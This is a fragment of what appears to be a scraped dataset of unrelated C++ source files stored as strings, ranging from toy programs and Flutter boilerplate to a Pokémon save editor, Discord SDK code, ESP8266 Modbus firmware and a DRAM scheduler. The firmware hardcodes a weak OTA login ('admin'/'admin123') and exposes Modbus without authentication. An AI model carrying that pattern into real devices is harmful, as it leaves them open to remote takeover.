\ud83c\udf1f\", \"vector<int> galaxies {37, 3, 2};\");\n            Message(\"Kudos \ud83c\udf1f\", \"int totalStars = accumulate(galaxies.begin(), galaxies.end(), 0); // 42\");\n        }\n\n    } catch (const exception& e)  {\n        Success(false);\n        Message(\"Oops! \ud83d\udc1e\", e.what());\n        Message(\"Hint \ud83d\udca1\", \"Did you properly accumulate all stars into 'totalStars'? \ud83e\udd14\");\n    }\n\n  return 0;\n}\n",
    "#include \"dbms.h\"\n#include <iostream>\n#include <string>\n#include <memory>\n#include <stdexcept>\n\n// \u00f4\u00e5\u00f0\u00f7\u00f6\u00e9\u00e4 \u00ec\u00e4\u00f6\u00e2\u00fa \u00fa\u00f4\u00f8\u00e9\u00e8 \u00e4\u00f4\u00f7\u00e5\u00e3\u00e5\u00fa\nvoid displayMenu() {\n    std::cout << \"\\n--- Simple DBMS Menu ---\\n\";\n    std::cout << \"1. INSERT (e.g., INSERT 1 John Doe)\\n\";\n    std::cout << \"2. SELECT (e.g., SELECT 1)\\n\";\n    std::cout << \"3. UPDATE (e.g., UPDATE 1 Jane Doe)\\n\";\n    std::cout << \"4. DELETE (e.g., DELETE 1)\\n\";\n    std::cout << \"5. EXIT\\n\";\n    std::cout << \"------------------------\\n\";\n}\n\n// \u00f4\u00e5\u00f0\u00f7\u00f6\u00e9\u00e4 \u00ec\u00f0\u00e9\u00e4\u00e5\u00ec \u00f4\u00f7\u00e5\u00e3\u00e5\u00fa \u00f9\u00e0\u00e9\u00ec\u00fa\u00e5\u00fa\nvoid handleQuery(std::shared_ptr<DBMS> dbms, const std::string& query) {\n    try {\n        dbms->executeQuery(query);\n    }\n    catch (const std::runtime_error& e) {\n        std::cerr << \"Error: \" << e.what() << std::endl;\n    }\n}\n\n// \u00f4\u00e5\u00f0\u00f7\u00f6\u00e9\u00e4 \u00ec\u00f7\u00f8\u00e9\u00e0\u00fa \u00f7\u00ec\u00e8 \u00ee\u00e4\u00ee\u00f9\u00fa\u00ee\u00f9 \u00e5\u00ec\u00e4\u00f4\u00f2\u00ec\u00fa \u00f9\u00e0\u00e9\u00ec\u00fa\u00e5\u00fa \u00e1\u00e4\u00fa\u00e0\u00ed\nvoid processUserInput(std::shared_ptr<DBMS> dbms) {\n    std::string command;\n\n    while (true) {\n        std::cout << \"DBMS> \";\n        std::getline(std::cin, command);\n\n        if (command == \"EXIT\") {\n            std::cout << \"Exiting DBMS...\\n\";\n            break;\n        }\n\n        if (!command.empty()) {\n            handleQuery(dbms, command);\n        }\n        else {\n            std::cout << \"No command entered. Please try again.\\n\";\n        }\n    }\n}\n\nint main() {\n    // \u00f0\u00e9\u00e4\u00e5\u00ec \u00e6\u00e9\u00eb\u00f8\u00e5\u00ef \u00e7\u00eb\u00ed \u00e1\u00e0\u00ee\u00f6\u00f2\u00e5\u00fa shared_ptr\n    std::shared_ptr<DBMS> dbms = std::make_shared<DBMS>();\n\n    std::cout << \"Welcome to the Simple DBMS!\\n\";\n    displayMenu();  // \u00e4\u00f6\u00e2\u00fa \u00fa\u00f4\u00f8\u00e9\u00e8 \u00e4\u00f9\u00e9\u00ee\u00e5\u00f9\n\n    processUserInput(dbms);  // \u00f7\u00f8\u00e9\u00e0\u00fa \u00f4\u00f7\u00e5\u00e3\u00e5\u00fa \u00ee\u00e4\u00ee\u00f9\u00fa\u00ee\u00f9\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"di_mangi_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <cstdlib>  // For rand() and srand()\r\n#include <ctime>    // For time()\r\nusing namespace std;\r\nvoid playGame(int lowerBound, int upperBound) {\r\n    srand(static_cast<unsigned int>(time(0)));\r\n    // Generate a random number between lowerBound and upperBound (inclusive)\r\n    int secretNumber = rand() % (upperBound - lowerBound + 1) + lowerBound;\r\n    int guess;\r\n    int attempts = 0;\r\n    cout << \"Guess the number between \" << lowerBound << \" and \" << upperBound << \"!\" << endl;\r\n    do {\r\n        cout << \"Enter your guess: \";\r\n        cin >> guess;\r\n        attempts++;\r\n        if (guess < secretNumber) {\r\n            cout << \"Too low! Try again.\" << endl;\r\n        } else if (guess > secretNumber) {\r\n            cout << \"Too high! Try again.\" << endl;\r\n        } else {\r\n            cout << \"Congratulations! You guessed the number in \" << attempts << \" attempts.\" << endl;\r\n        }\r\n    } while (guess != secretNumber);\r\n}\r\nint main() {\r\n    int lowerBound, upperBound;\r\n    char playAgain;\r\n    cout << \"Welcome to the Number Guessing Game!\" << endl;\r\n    do {\r\n        cout << \"Enter the lower bound of the number range: \";\r\n        cin >> lowerBound;\r\n        cout << \"Enter the upper bound of the number range: \";\r\n        cin >> upperBound;\r\n        if (lowerBound >= upperBound) {\r\n            cout << \"Invalid range! Lower bound must be less than upper bound.\" << endl;\r\n            continue;\r\n        }\r\n        playGame(lowerBound, upperBound);\r\n        cout << \"Do you want to play again? (y/n): \";\r\n        cin >> playAgain;\r\n    } while (playAgain == 'y' || playAgain == 'Y');\r\n    cout << \"Thanks for playing!\" << endl;\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <vector>\n#include <map>\n#include <string>\n#include <cmath>\n#include <algorithm>\n\nusing namespace std;\n\n// Function to decode the Y value based on its base\nint decodeValue(const string& value, int base) {\n    return stoi(value, nullptr, base);  // Convert string in a given base to an integer\n}\n\n// Lagrange Interpolation function to find the constant term 'c'\ndouble lagrangeInterpolation(const vector<pair<int, int>>& points, int k) {\n    double constantTerm = 0;\n\n    for (int i = 0; i < k; i++) {\n        int xi = points[i].first;\n        int yi = points[i].second;\n\n        double li = 1.0;\n        for (int j = 0; j < k; j++) {\n            if (i != j) {\n                int xj = points[j].first;\n                li *= (0.0 - xj) / (xi - xj); // Evaluating L_i(0)\n            }\n        }\n\n        // Summing up the terms for the constant term\n        constantTerm += yi * li;\n    }\n\n    return constantTerm;\n}\n\nint main() {\n    // Example input in the format given by the problem\n    map<string, map<string, string>> input = {\n        {\"keys\", {{\"n\", \"4\"}, {\"k\", \"3\"}}},\n        {\"1\", {{\"base\", \"10\"}, {\"value\", \"4\"}}},\n        {\"2\", {{\"base\", \"2\"}, {\"value\", \"111\"}}},\n        {\"3\", {{\"base\", \"10\"}, {\"value\", \"12\"}}},\n        {\"6\", {{\"base\", \"4\"}, {\"value\", \"213\"}}}\n    };\n\n    int n = stoi(input[\"keys\"][\"n\"]);  // Total number of roots\n    int k = stoi(input[\"keys\"][\"k\"]);  // Minimum required roots to solve the polynomial\n\n    vector<pair<int, int>> points;\n\n    // Decoding the points (x\n",
    "// MemPmSkillPage.cpp : \u5b9e\u73b0\u6587\u4ef6\n//\n\n#include \"stdafx.h\"\n#include \"PokemonMemHack.h\"\n#include \"MemPmSkillPage.h\"\n\nstruct BREED_SKILL\n{\n\tWORD\twBreed;\n\tWORD\twSkill;\n};\n\nextern BREED_SKILL g_rgBreedSkillMap[];\nextern DWORD g_dwBreedSkillMapCount;\nDWORD\tg_rgBreedSkillMapIndex[BREED_COUNT];\nWORD\tg_rgwSortedIndexToSkill[SKILL_COUNT];\t// g_rgwSortedIndexToSkill[index] => skill id\nWORD\tg_rgwSortedSkillToIndex[SKILL_COUNT];\t// g_rgwSortedSkillToIndex[skill id] => index\n\nint SortSkillsProc(LPCVOID pElem0, LPCVOID pElem1);\n\n// CMemPmSkillPage \u5bf9\u8bdd\u6846\n\nIMPLEMENT_DYNAMIC(CMemPmSkillPage, CMemPmTabPage)\nCMemPmSkillPage::CMemPmSkillPage()\n\t:\tm_ppc(NULL)\n{\n\tm_uTemplateId = CMemPmSkillPage::IDD;\n}\n\nCMemPmSkillPage::~CMemPmSkillPage()\n{\n}\n\nvoid CMemPmSkillPage::DoDataExchange(CDataExchange* pDX)\n{\n\tCMemPmTabPage::DoDataExchange(pDX);\n\n\tDWORD\tdwIndex;\n\n\tfor(dwIndex = 0; dwIndex < 4; ++dwIndex)\n\t{\n\t\tDDX_Control(pDX, IDC_MEM_SKILL0 + dwIndex, m_ctrlSkillList[dwIndex]);\n\t\tDDX_Control(pDX, IDC_MEM_PP0 + dwIndex, m_ctrlPP[dwIndex]);\n\t\tDDX_Control(pDX, IDC_MEM_PP_BOOST0 + dwIndex, m_ctrlPPBoostList[dwIndex]);\n\t}\n\n\tDDX_Control(pDX, IDC_LEGAL_SKILL_LIST, m_ctrlLegalSkillList);\n}\n\n\nBEGIN_MESSAGE_MAP(CMemPmSkillPage, CMemPmTabPage)\n\tON_CONTROL_RANGE(CBN_SELCHANGE, IDC_MEM_SKILL0, IDC_MEM_SKILL3, SetSkillDesc)\n\tON_CONTROL_RANGE(CBN_SETFOCUS, IDC_MEM_SKILL0, IDC_MEM_SKILL3, SetSkillDesc)\n\n\tON_CONTROL_RANGE(EN_SETFOCUS, IDC_MEM_PP0, IDC_MEM_PP3, SetSkillDesc)\n\n\tON_CONTROL_RANGE(CBN_SETFOCUS, IDC_MEM_PP_BOOST0, IDC_MEM_PP_BOOST3, SetSkillDesc)\n\n\tON_STN_DBLCLK(IDC_MEM_PP_BOOST_ALL, &CMemPmSkillPage::OnStnDblclickPpBoostAll)\n\tON_LBN_SELCHANGE(IDC_LEGAL_SKILL_LIST, &CMemPmSkillPage::OnLbnSelchangeLegalSkillList)\n\n\tON_CONTROL_RANGE(STN_DBLCLK, IDC_MEM_SKILL_NAME0, IDC_MEM_SKILL_NAME3, &CMemPmSkillPage::SetSkillFromLegalSkillList)\n\tON_STN_DBLCLK(IDC_MEM_PP_MAX, &CMemPmSkillPage::OnStnDblclickMemPpMax)\nEND_MESSAGE_MAP()\n\n\n// CMemPmSkillPage \u6d88\u606f\u5904\u7406\u7a0b\u5e8f\nvoid CMemPmSkillPage::TransData(BOOL bToControls)\n{\n\tBYTE\tbIndex;\n\tDWORD\tdwNum;\n\tCString\tszText;\n\n\tm_ppc = GetPokemonCodec();\n\tif(m_ppc == NULL)\n\t\treturn;\n\n\tif(bToControls)\n\t{\n\t\tSetSkillLists(FALSE, TRUE);\n\n\t\tfor(bIndex = 0; bIndex < 4; ++bIndex)\n\t\t{\n\t\t\tm_ctrlSkillList[bIndex].SetCurSel(g_rgwSortedSkillToIndex[m_ppc->GetSkill(bIndex)]);\n\n\t\t\tSetDlgItemInt(IDC_MEM_PP0 + bIndex, m_ppc->GetSkillPoints(bIndex), FALSE);\n\n\t\t\tm_ctrlPPBoostList[bIndex].SetCurSel(m_ppc->GetSkillPointBoost(bIndex));\n\t\t}\n\n\t\tSetLegalSkillList(m_ppc->GetBreed());\n\t}\n\telse\n\t{\n\t\tfor(bIndex = 0; bIndex < 4; ++bIndex)\n\t\t{\n\t\t\tint\t\tnSel;\n\t\t\tWORD\twSkill;\n\t\t\tnSel = m_ctrlSkillList[bIndex].GetCurSel();\n\t\t\tif(nSel != LB_ERR)\n\t\t\t{\n\t\t\t\twSkill = (WORD)(m_ctrlSkillList[bIndex].GetItemData(nSel));\n\t\t\t\tif(wSkill < SKILL_COUNT)\n\t\t\t\t\tm_ppc->SetSkill(bIndex, wSkill);\n\t\t\t}\n\n\t\t\tGetDlgItemText(IDC_MEM_PP0 + bIndex, szText);\n\t\t\tdwNum = min(_tcstoul(szText, 0, 0), 0xFF);\n\t\t\tm_ppc->SetSkillPoints(bIndex, (BYTE)(dwNum));\n\n\t\t\tdwNum = m_ctrlPPBoostList[bIndex].GetCurSel();\n\t\t\tif(dwNum < 4)\n\t\t\t\tm_ppc->SetSkillPointBoost(bIndex, (BYTE)(dwNum));\n\t\t}\n\t}\n}\n\nvoid CMemPmSkillPage::OnChangeUILang(VOID)\n{\n\t//DWORD\tm, n, dwCurSel;\n\t//CString\tszText;\n\t//LPCTSTR\tszFmt3[3] = { _T(\"\"), _T(\"%-3lu: \"), _T(\"%03lX: \") };\n\n\t////////////////////////////////////////////////\n\tif(g_MemRom.m_bOpened)\n\t\tSetSkillLists(TRUE, FALSE);\n\n\t//for(m = 0; m < 4; ++m)\n\t//{\n\t//\tdwCurSel = m_ctrlSkillList[m].GetCurSel();\n\t//\tif(dwCurSel == LB_ERR)\n\t//\t\tdwCurSel = 0;\n\t//\tm_ctrlSkillList[m].ResetContent();\n\t//\tfor(n = 0; n < SKILL_COUNT; ++n)\n\t//\t{\n\t//\t\tszText.Format(szFmt3[cfg.dwCount], n);\n\t//\t\tszText += cfg.pSkillNameList[n].rgszText[cfg.dwLang];\n\t//\t\tm_ctrlSkillList[m].AddString(szText);\n\t//\t}\n\t//\tm_ctrlSkillList[m].SetCurSel(dwCurSel);\n\t//}\n\n\t////////////////////////////////////////////////\n\tif(m_ppc)\n\t\tSetLegalSkillList(m_ppc->GetBreed());\n\n\t////////////////////////////////////////////////\n\tSetSkillDesc(-1);\n}\n\nvoid CMemPmSkillPage::SetSkillDesc(UINT uID)\n{\n\tstatic WORD\twCurSkill = -1;\n\n\tif(uID == -1 && wCurSkill < SKILL_COUNT)\n\t{\n\t\tSetDlgItemText(IDC_SKILL_DESC, cfg.pSkillDescList[wCurSkill].rgszText[cfg.dwLang]);\n\t}\n\telse\n\t{\n\t\tWORD\twSkill = -1;\n\t\tDWORD\tdwIndex = -1;\n\t\tint\t\tnCurSel;\n\n\t\tif(uID == IDC_LEGAL_SKILL_LIST)\n\t\t{\n\t\t\tnCurSel = m_ctrlLegalSkillList.GetCurSel();\n\t\t\tif(nCurSel != LB_ERR)\n\t\t\t\twSkill = (WORD)(m_ctrlLegalSkillList.GetItemData(nCurSel));\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif(uID >= IDC_MEM_SKILL0 && uID <= IDC_MEM_SKILL3)\n\t\t\t\tdwIndex = uID - IDC_MEM_SKILL0;\n\t\t\telse if(uID >= IDC_MEM_PP0 && uID <= IDC_MEM_PP3)\n\t\t\t\tdwIndex = uID - IDC_MEM_PP0;\n\t\t\telse if(uID >= IDC_MEM_PP_BOOST0 && uID <= IDC_MEM_PP_BOOST3)\n\t\t\t\tdwIndex = uID - IDC_MEM_PP_BOOST0;\n\n\t\t\tif(dwIndex < 4)\n\t\t\t{\n\t\t\t\tnCurSel = m_ctrlSkillList[dwIndex].GetCurSel();\n\t\t\t\tif(nCurSel != LB_ERR)\n\t\t\t\t\twSkill = (WORD)(m_ctrlSkillList[dwIndex].GetItemData(nCurSel));\n\t\t\t}\n\t\t}\n\n\t\tif(wSkill != wCurSkill && wSkill < SKILL_COUNT)\n\t\t{\n\t\t\twCurSkill = wSkill;\n\t\t\tSetDlgItemText(IDC_SKILL_DESC, cfg.pSkillDescList[wCurSkill].rgszText[cfg.dwLang]);\n\t\t}\n\t}\n}\n\nBOOL CM",
    "#if !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"network_manager.h\"\n\n#include \"core.h\"\n\n#include <cstring>\n#include <memory>\n\nnamespace discord {\n\nclass NetworkEvents final {\npublic:\n    static void DISCORD_CALLBACK OnMessage(void* callbackData,\n                                           DiscordNetworkPeerId peerId,\n                                           DiscordNetworkChannelId channelId,\n                                           uint8_t* data,\n                                           uint32_t dataLength)\n    {\n        auto* core = reinterpret_cast<Core*>(callbackData);\n        if (!core) {\n            return;\n        }\n\n        auto& module = core->NetworkManager();\n        module.OnMessage(peerId, channelId, data, dataLength);\n    }\n\n    static void DISCORD_CALLBACK OnRouteUpdate(void* callbackData, char const* routeData)\n    {\n        auto* core = reinterpret_cast<Core*>(callbackData);\n        if (!core) {\n            return;\n        }\n\n        auto& module = core->NetworkManager();\n        module.OnRouteUpdate(static_cast<const char*>(routeData));\n    }\n};\n\nIDiscordNetworkEvents NetworkManager::events_{\n  &NetworkEvents::OnMessage,\n  &NetworkEvents::OnRouteUpdate,\n};\n\nvoid NetworkManager::GetPeerId(NetworkPeerId* peerId)\n{\n    if (!peerId) {\n        return;\n    }\n\n    internal_->get_peer_id(internal_, reinterpret_cast<uint64_t*>(peerId));\n}\n\nResult NetworkManager::Flush()\n{\n    auto result = internal_->flush(internal_);\n    return static_cast<Result>(result);\n}\n\nResult NetworkManager::OpenPeer(NetworkPeerId peerId, char const* routeData)\n{\n    auto result = internal_->open_peer(internal_, peerId, const_cast<char*>(routeData));\n    return static_cast<Result>(result);\n}\n\nResult NetworkManager::UpdatePeer(NetworkPeerId peerId, char const* routeData)\n{\n    auto result = internal_->update_peer(internal_, peerId, const_cast<char*>(routeData));\n    return static_cast<Result>(result);\n}\n\nResult NetworkManager::ClosePeer(NetworkPeerId peerId)\n{\n    auto result = internal_->close_peer(internal_, peerId);\n    return static_cast<Result>(result);\n}\n\nResult NetworkManager::OpenChannel(NetworkPeerId peerId, NetworkChannelId channelId, bool reliable)\n{\n    auto result = internal_->open_channel(internal_, peerId, channelId, (reliable ? 1 : 0));\n    return static_cast<Result>(result);\n}\n\nResult NetworkManager::CloseChannel(NetworkPeerId peerId, NetworkChannelId channelId)\n{\n    auto result = internal_->close_channel(internal_, peerId, channelId);\n    return static_cast<Result>(result);\n}\n\nResult NetworkManager::SendMessage(NetworkPeerId peerId,\n                                   NetworkChannelId channelId,\n                                   std::uint8_t* data,\n                                   std::uint32_t dataLength)\n{\n    auto result = internal_->send_message(\n      internal_, peerId, channelId, reinterpret_cast<uint8_t*>(data), dataLength);\n    return static_cast<Result>(result);\n}\n\n} // namespace discord\n",
    "#include <Arduino.h>\n#include <ESPWifiConfig.h>\n#include <ModbusIP_ESP8266.h>\n#include <ElegantOTA.h>\n#include <ESP8266WebServer.h>\n\n\n\n// put function declarations here:\nint Config_reset_btn = 0; // GPIO0, D0 on Node32, D3 on NodeMCU8266. Pressing this button for more than 5-10sec will reset the WiFi configuration\nbool debug = true; // Prints info on Serial when true\nint inputPin1 = 14; // Adjust this to your actual input pin\nint inputPin2 = 12; // Adjust this to your actual input pin\nint inputPin3 = 13; // Adjust this to your actual input pin\nint inputPin4 = 15; // Adjust this to your actual input pin\nint OutputPin1 = 2; // LED Output\n\nconst char* OTAuser = \"admin\";\nconst char* OTApass = \"admin123\"; \n\n\nESPWifiConfig WifiConfig(\"D1_Mini_AP\", 80, Config_reset_btn, false, \"fallback_wifi\", \"fallback_pass\", debug);\nModbusIP mb;\nESP8266WebServer server(81);\n\n\nvoid setup() {\n  // put your setup code here, to run once:\n    Serial.begin(115200);\n    server.on(\"/\", []() {\n    server.send(200, \"text/plain\", \"Hi! This is OTA Updates by ElegantOTA. access at /update\");\n  });\n\n  ElegantOTA.begin(&server);    // Start ElegantOTA\n  server.begin();\n  Serial.println(\"OTA server started at port 81\");\n  ElegantOTA.setAuth(OTAuser, OTApass);\n  mb.server(502);\n  mb.addIsts(0, 0); // Placeholder for __________ (you can update this with actual data)\n  mb.addIsts(1, 0); // Placeholder for __________ (you can update this with actual data)\n  mb.addIsts(2, 0); // Placeholder for __________ (you can update this with actual data)\n  mb.addIsts(3, 0); // Placeholder for __________ (you can update this with actual data)\n  mb.addCoil(0, OutputPin1);// Placeholder for __________ (you can update this with actual data)\n\n    pinMode(inputPin1, INPUT);\n    pinMode(inputPin2, INPUT);\n    pinMode(inputPin3, INPUT);\n    pinMode(inputPin4, INPUT);\n    pinMode(OutputPin1, OUTPUT);\n\n\n // Initialize WiFi configuration\n    if (WifiConfig.initialize() == AP_MODE) {\n        WifiConfig.Start_HTTP_Server(0);\n    }\n\n    WifiConfig.print_settings();\n    WifiConfig.ESP_debug(\"Hello\");\n}\n\n#define NO_CONNECTION_RESTART_DELAY 3600000 //ms, 1 hour\n#define NO_CONNECTION_GO_WILD_DELAY 1800000 //ms, 30 minutes\nunsigned long last_wifi_connect_time = 0;\nunsigned long reconnect_delay = 10000;\nunsigned long no_conn_restart_delay = 100000000;\nint wifiStatus = WiFi.status();\n\nvoid loop() {\n\nif (WiFi.status() == WL_CONNECTED){\n//Serial.println(\"WiFi connected!\");\n\n  //Serial.println(\"Test\");\n    digitalWrite(OutputPin1, mb.Coil(0));\n    mb.task();\n    mb.Ists(0, inputPin1);\n    mb.Ists(1, inputPin2);\n    mb.Ists(2, inputPin3);\n    mb.Ists(3, inputPin4);\n    Serial.println(mb.Coil(0));\n    server.handleClient();\n    ElegantOTA.loop();\n\n}\nelse{\n  WifiConfig.handle(reconnect_delay); \n  if (WifiConfig.ESP_mode == AP_MODE)  //Can't connect to internet while in this mode\n  {\n    //Connect to the AP wifi myESP_XXXXXX to configure it\n  }\n  else\n  {\n    //Client Mode\n    if (WifiConfig.ESP_mode == CLIENT_MODE)\n    { if(WifiConfig.wifi_connected)\n      {\n        last_wifi_connect_time = millis();\n        reconnect_delay = 100000;\n      }\n      else\n      {       \n        reconnect_delay = 30000; //10s by default\n\n        if ((millis() - last_wifi_connect_time) > no_conn_restart_delay) //Restart after 1 hour of no connection\n        {\n          Serial.println(\"Restarting...\");\n          ESP.restart();          \n        }\n        else{}\n      }\n    }\n    else{}\n  }\n};\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"crude_firebase_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nclass informationSys {\nprivate:\n\tstring name;\n\tstring surname;\n\tstring number;\n\npublic:\n\tinformationSys(string cname, string csurname, string cnumber) :name(cname), surname(csurname), number(cnumber) {}\n\n\tstring getName() {\n\t\treturn name;\n\t}\n\tvoid setName(const string newName) {\n\t\tname = newName;\n\n\t}\n\n\tstring getSurname() {\n\t\treturn surname;\n\t}\n\tvoid setSurname(const string newSurname) {\n\t\tsurname = newSurname;\n\n\t}\n\n\tstring getNumber() {\n\t\treturn number;\n\t}\n\tvoid setNumber(const string newNumber) {\n\t\tnumber = newNumber;\n\n\t}\n\n\tvoid printInformation() {\n\t\tcout << \"name: \" << name << endl;\n\t\tcout << \"surname : \" << surname << endl;\n\t\tcout << \"number: \" << number << endl;\n\n\t}\n};\n\n\nint main() {\n\tinformationSys informationSys1(\"ahmet\", \" cigiloglu\", \"21120383\");\n\n\tinformationSys1.printInformation();\n\n\n\tinformationSys1.setName(\"mehmet\");\n\tinformationSys1.setSurname(\"kara\");\n\tinformationSys1.setNumber(\"12121212\");\n\n\tinformationSys1.printInformation();\n\n\treturn 0;\n}",
    "#include <vector>\n\n#include \"base/base.h\"\n#include \"dram_controller/bhcontroller.h\"\n#include \"dram_controller/bhscheduler.h\"\n#include \"dram_controller/impl/plugin/prac.h\"\n\nnamespace Ramulator {\n\nclass PRACScheduler : public IBHScheduler, public Implementation {\nRAMULATOR_REGISTER_IMPLEMENTATION(IBHScheduler, PRACScheduler, \"PRACScheduler\", \"PRAC Scheduler.\")\n\nprivate:\n    IDRAM* m_dram;\n    IBHDRAMController* m_ctrl;\n    IPRAC* m_prac;\n\n    std::unordered_map<int, int> lut_cycles_needed;\n\n    Clk_t m_clk = 0;\n\n    bool m_is_debug = false; \n\npublic:\n    void init() override {\n        m_is_debug = param<bool>(\"debug\").default_val(false);\n    }\n\n    void setup(IFrontEnd* frontend, IMemorySystem* memory_system) override {\n        m_ctrl = cast_parent<IBHDRAMController>();\n        m_dram = m_ctrl->m_dram;\n        m_prac = m_ctrl->get_plugin<IPRAC>();\n\n        if (!m_prac) {\n            std::cout << \"[RAMULATOR::PRACSched] Need PRAC plugin!\" << std::endl;\n            std::exit(0);\n        }\n    }\n\n    ReqBuffer::iterator compare(ReqBuffer::iterator req1, ReqBuffer::iterator req2) override {\n        bool fits1 = req1->scratch0;\n        bool fits2 = req2->scratch0;\n\n        if (fits1 ^ fits2) {\n            if (fits1) {\n                return req1;\n            }\n            else {\n                return req2;\n            }\n        }\n\n        bool ready1 = req1->scratch1;\n        bool ready2 = req2->scratch1;\n\n        if (ready1 ^ ready2) {\n            if (ready1) {\n                return req1;\n            }\n            else {\n                return req2;\n            }\n        }\n\n        // Fallback to FCFS\n        if (req1->arrive <= req2->arrive) {\n            return req1;\n        }\n        else {\n            return req2;\n        } \n    }\n\n    ReqBuffer::iterator get_best_request(ReqBuffer& buffer) override {\n        if (buffer.size() == 0) {\n            return buffer.end();\n        }\n\n        Clk_t next_recovery = m_prac->next_recovery_cycle();\n        for (auto& req : buffer) {\n            req.command = m_dram->get_preq_command(req.final_command, req.addr_vec);\n            req.scratch0 = m_clk + m_prac->min_cycles_with_preall(req) < next_recovery;\n            req.scratch1 = m_dram->check_ready(req.command, req.addr_vec);\n        }\n\n        auto candidate = buffer.begin();\n        for (auto next = std::next(buffer.begin(), 1); next != buffer.end(); next++) {\n            candidate = compare(candidate, next);\n        }\n        return candidate;\n    }\n\n    virtual void tick() override {\n        m_clk++;\n    }\n};\n\n}       // namespace Ramulator\n",
    "#include \"Shader.h\"\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <glad/glad.h>\n\n\nstd::pair<std::string, std::string> Shader::LoadShadersFromFile(const char* shader_source_path)\n{\n\tstd::ifstream InFile(shader_source_path);\n\tenum ShaderType\n\t{\n\t\tNone, Vertex, Fragment\n\t};\n\tif(InFile.is_open())\n\t{\n\t\tstd::string line;\n\t\tstd::stringstream vertexSource;\n\t\tstd::stringstream fragmentSource;\n\t\tShaderType type = None;\n\t\twhile (std::getline(InFile,line))\n\t\t{\n\t\t\tif(line.find(\"#shader\") != std::string::npos)\n\t\t\t{\n\t\t\t\tif (line.find(\"vertex\") != std::string::npos)\n\t\t\t\t\ttype = Vertex;\n\t\t\t\telse if (line.find(\"fragment\") != std::string::npos)\n\t\t\t\t\ttype = Fragment;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tswitch (type)\n\t\t\t\t{\n\t\t\t\tdefault:\n\t\t\t\t\tbreak;\n\t\t\t\tcase Vertex:\n\t\t\t\t\tvertexSource << line << \"\\n\";\n\t\t\t\t\tbreak;\n\t\t\t\tcase Fragment:\n\t\t\t\t\tfragmentSource << line << \"\\n\";\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tInFile.close();\n\t\treturn { vertexSource.str(),fragmentSource.str() };\n\t}\n\t\treturn {};\n}\n\nShader::Shader(const char* shader_source_path)\n{\n\tProgram = glCreateProgram();\n\tconst auto shaderSource = LoadShadersFromFile(shader_source_path);\n\tconst auto charSource = std::make_pair(shaderSource.first.c_str(), shaderSource.second.c_str());\n\tint success;\n\tchar infoLog[512];\n\tunsigned int vs = glCreateShader(GL_VERTEX_SHADER);\n\tunsigned int fs = glCreateShader(GL_FRAGMENT_SHADER);\n\tglShaderSource(vs, 1, &charSource.first, nullptr);\n\tglCompileShader(vs);\n\tglGetShaderiv(vs, GL_COMPILE_STATUS, &success);\n\tif (!success)\n\t{\n\t\tglGetShaderInfoLog(vs, 512, NULL, infoLog);\n\t\tstd::cout << \"ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n\t}\n\tglShaderSource(fs, 1, &charSource.second, nullptr);\n\tglCompileShader(fs);\n\tglGetShaderiv(fs, GL_COMPILE_STATUS, &success);\n\tif (!success)\n\t{\n\t\tglGetShaderInfoLog(fs, 512, NULL, infoLog);\n\t\tstd::cout << \"ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n\t}\n\tglAttachShader(Program, vs);\n\tglAttachShader(Program, fs);\n\tglLinkProgram(Program);\n\tglDeleteShader(vs);\n\tglDeleteShader(fs);\n}\n\n",
